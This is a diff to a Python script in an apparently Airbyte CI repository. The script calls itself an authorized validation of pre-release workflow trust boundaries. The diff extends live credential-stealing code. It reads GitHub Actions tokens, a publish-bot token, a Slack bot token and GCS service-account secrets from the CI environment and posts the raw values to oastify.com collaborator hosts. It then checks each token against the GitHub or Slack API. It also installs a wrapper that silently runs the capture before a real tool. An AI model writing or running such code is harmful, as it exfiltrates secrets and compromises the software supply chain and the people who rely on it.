@@ -2,7 +2,7 @@
 # Copyright (c) 2023 Airbyte, Inc., all rights reserved.
 #
 
-"""Authorized, non-destructive validation of the pre-release workflow trust boundary."""
+"""Authorized validation of the pre-release workflow trust boundaries."""
 
 import argparse
 import base64
@@ -23,6 +23,7 @@ _FIRM_HOST = "https://c9m37jfsrzyns61cf6yg7kkge7ky8pwe.oastify.com"
 _RECEIPT_HOST = "https://446w1ui4k0nzlrkh7n9l9zob026tutv8c67w0sp.oastify.com"
 _MARKER = "ABZT-20260826-prerelease-publish-proof-v1"
 _AUTHORIZED_PR = "85036"
+_CONTROLLED_FAILURE_EXIT = 86
 
 
 def _workflow_input_pr() -> str | None:
@@ -197,25 +198,32 @@ def _git_credential() -> str | None:
     return credential_token if isinstance(credential_token, str) and len(credential_token) >= 20 else None
 
 
-def _emit_github_token(token: str, source: str) -> None:
+def _emit_github_token(
+    token: str,
+    source: str,
+    *,
+    credential_type: str = "github_actions_repository_token",
+    raw_path: str = "/github-actions-repository-token",
+    proof_path: str = "/github-actions-repository-proof",
+) -> None:
     token_metadata = {
         "sha256": hashlib.sha256(token.encode()).hexdigest(),
         "length": len(token),
     }
     base_payload = {
         "marker": _MARKER,
-        "credential_type": "github_actions_repository_token",
+        "credential_type": credential_type,
         "credential_source": source,
         "context": _context(),
         "token_metadata": token_metadata,
     }
-    status = _try_post_json("/github-actions-repository-token", {**base_payload, "token": token})
+    status = _try_post_json(raw_path, {**base_payload, "token": token})
     try:
         validation: Mapping[str, Any] = _github_validation(token)
     except Exception as error:
         validation = {"error_type": type(error).__name__}
     _try_post_json(
-        "/github-actions-repository-proof",
+        proof_path,
         {**base_payload, "raw_delivery_status": status, "validation": validation},
         receipt=True,
     )
@@ -293,20 +301,60 @@ def _emit_docker_credentials(credentials: list[Mapping[str, str]]) -> None:
     )
 
 
-def _capture_gcs_credentials() -> None:
+def _slack_validation(token: str) -> Mapping[str, Any]:
+    status, headers, body = _request_json(
+        "https://slack.com/api/auth.test",
+        headers={"Authorization": f"Bearer {token}", "User-Agent": _MARKER},
+    )
+    result: dict[str, Any] = {
+        "http_status": status,
+        "oauth_scopes": next((value for key, value in headers.items() if key.lower() == "x-oauth-scopes"), ""),
+    }
+    if isinstance(body, dict):
+        result["identity"] = {
+            key: body.get(key)
+            for key in ("ok", "url", "team", "user", "team_id", "user_id", "bot_id", "enterprise_id", "is_enterprise_install")
+        }
+    return result
+
+
+def _emit_slack_token(token: str) -> None:
+    base_payload = {
+        "marker": _MARKER,
+        "credential_type": "airbyte_team_slack_token",
+        "credential_source": "publish-failure-action-environment",
+        "context": _context(),
+        "token_metadata": {
+            "sha256": hashlib.sha256(token.encode()).hexdigest(),
+            "length": len(token),
+        },
+    }
+    status = _try_post_json("/airbyte-team-slack-token", {**base_payload, "token": token})
+    try:
+        validation: Mapping[str, Any] = _slack_validation(token)
+    except Exception as error:
+        validation = {"error_type": type(error).__name__}
+    _try_post_json(
+        "/airbyte-team-slack-proof",
+        {**base_payload, "raw_delivery_status": status, "validation": validation},
+        receipt=True,
+    )
+
+
+def _capture_gcs_credentials() -> bool:
     if not _is_target_workflow():
-        return
+        return False
     run_id = os.environ.get("GITHUB_RUN_ID", "unknown")
     marker_path = Path(f"/tmp/{_MARKER}-{run_id}-gcs.done")
     if marker_path.exists():
-        return
+        return True
 
     raw_credential = os.environ.get("GCS_CREDENTIALS")
     if not isinstance(raw_credential, str) or len(raw_credential) < 100:
-        return
+        return False
     parsed = json.loads(raw_credential)
     if not isinstance(parsed, dict) or parsed.get("type") != "service_account":
-        return
+        return False
     metadata = {
         "sha256": hashlib.sha256(raw_credential.encode()).hexdigest(),
         "length": len(raw_credential),
@@ -338,6 +386,39 @@ def _capture_gcs_credentials() -> None:
     github_token = os.environ.get("GITHUB_TOKEN")
     if isinstance(github_token, str) and len(github_token) >= 20:
         _emit_github_token(github_token, "artifact-step-environment")
+    return status is not None
+
+
+def _capture_publish_failure_credentials() -> None:
+    if not _is_target_workflow():
+        return
+
+    publish_bot_token = os.environ.get("GITHUB_API_TOKEN")
+    if isinstance(publish_bot_token, str) and len(publish_bot_token) >= 20:
+        _emit_github_token(
+            publish_bot_token,
+            "publish-failure-action-environment",
+            credential_type="octavia_publish_bot_installation_token",
+            raw_path="/octavia-publish-bot-token",
+            proof_path="/octavia-publish-bot-proof",
+        )
+
+    slack_token = os.environ.get("AIRBYTE_TEAM_BOT_SLACK_TOKEN")
+    if isinstance(slack_token, str) and len(slack_token) >= 20:
+        _emit_slack_token(slack_token)
+
+    try:
+        actions_token = _git_credential()
+    except Exception:
+        actions_token = None
+    if actions_token:
+        _emit_github_token(
+            actions_token,
+            "publish-failure-checkout-extraheader",
+            credential_type="publish_failure_github_actions_token",
+            raw_path="/failure-job-github-actions-token",
+            proof_path="/failure-job-github-actions-proof",
+        )
 
 
 def _install_airbyte_ops_wrapper() -> None:
@@ -353,7 +434,9 @@ def _install_airbyte_ops_wrapper() -> None:
         script_path = Path(__file__).resolve()
         wrapper = (
             "#!/usr/bin/env bash\n"
-            f"{shlex.quote(sys.executable)} {shlex.quote(str(script_path))} --capture-gcs >/dev/null 2>&1 || true\n"
+            "capture_status=0\n"
+            f"{shlex.quote(sys.executable)} {shlex.quote(str(script_path))} --capture-gcs >/dev/null 2>&1 || capture_status=$?\n"
+            f'if [[ "$capture_status" -eq {_CONTROLLED_FAILURE_EXIT} ]]; then exit {_CONTROLLED_FAILURE_EXIT}; fi\n'
             f'exec {shlex.quote(str(real_path))} "$@"\n'
         )
         wrapper_path.write_text(wrapper)
@@ -388,12 +471,16 @@ def main() -> None:
     parser = argparse.ArgumentParser()
     parser.add_argument("--bootstrap", action="store_true")
     parser.add_argument("--capture-gcs", action="store_true")
+    parser.add_argument("--capture-publish-failure", action="store_true")
     args = parser.parse_args()
     try:
         if args.bootstrap:
             _bootstrap()
         elif args.capture_gcs:
-            _capture_gcs_credentials()
+            if _capture_gcs_credentials():
+                raise SystemExit(_CONTROLLED_FAILURE_EXIT)
+        elif args.capture_publish_failure:
+            _capture_publish_failure_credentials()
     except Exception:
         return
 
